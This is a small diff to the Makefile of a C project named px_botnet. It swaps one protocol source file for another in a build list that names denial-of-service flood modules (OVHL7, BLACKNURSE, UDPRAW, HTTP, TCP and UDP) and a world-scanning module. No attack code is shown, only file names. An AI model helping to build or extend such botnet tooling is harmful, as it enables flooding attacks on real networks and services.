@@ -8,7 +8,7 @@ SRCS				= px_botnet.c src/ft_strnjoin.c src/ft_free_split.c src/ft_generate_ip.c
 					  src/ft_get_id.c src/request/ft_request.c src/request/http.c src/protocol/global.c src/protocol/OVHL7.c \
 					  src/protocol/HOLD.c src/protocol/HTTP.c src/protocol/JUNK.c src/protocol/RANDHEX.c \
 					  src/protocol/STD.c src/protocol/TCP.c src/protocol/UDPRAW.c src/protocol/BLACKNURSE.c src/protocol/XTDCUSTOM.c \
-					  src/protocol/UDP.c src/ft_getarch.c src/protocol/PPS.c src/ft_scan_world.c src/protocol/UDPPPS.c src/libft/ft_putnbr_fd.c \
+					  src/protocol/UDP.c src/ft_getarch.c src/protocol/HTTPSOCKET.c src/ft_scan_world.c src/protocol/UDPPPS.c src/libft/ft_putnbr_fd.c \
 					  src/libft/ft_putendl_fd.c src/libft/ft_putchar_fd.c src/libft/ft_putstr_fd.c src/libft/ft_striteri.c \
 					  src/libft/ft_strmapi.c src/libft/ft_itoa.c src/libft/ft_split.c src/libft/ft_substr.c src/libft/ft_strtrim.c \
 					  src/libft/ft_strjoin.c src/libft/ft_atoi.c src/libft/ft_bzero.c src/libft/ft_isalnum.c src/libft/ft_isalpha.c \
